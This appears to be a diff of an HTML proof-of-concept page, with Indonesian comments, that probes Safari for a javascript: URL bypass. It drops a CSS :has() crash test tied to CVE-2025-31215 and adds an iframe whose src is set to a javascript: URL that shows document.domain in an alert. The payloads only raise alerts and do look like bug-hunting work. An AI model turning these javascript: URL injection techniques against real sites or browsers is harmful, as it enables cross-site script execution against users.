@@ -1,10 +1,7 @@
-<style>
-/* Ini yang bikin crash di CVE-2025-31215 */
-div:has(> img[src="x"]:not(:has(+ *))){
-  background: url("javascript:alert(document.domain)");
-}
-</style>
-<div><img src="x"><p>Test :has() bypass</p></div>
+<iframe id="f" srcdoc="<script>alert('Safari Only: '+document.domain)</script>"></iframe>
 <script>
-console.log("Kalau Safari crash atau alert muncul = BUG valid CVE style");
+let f = document.getElementById('f');
+f.src = "javascript:alert('Bypass? '+document.domain)";
+// Di Chrome: blocked
+// Di Safari: kadang masih alert = JS URL BYPASS
 </script>
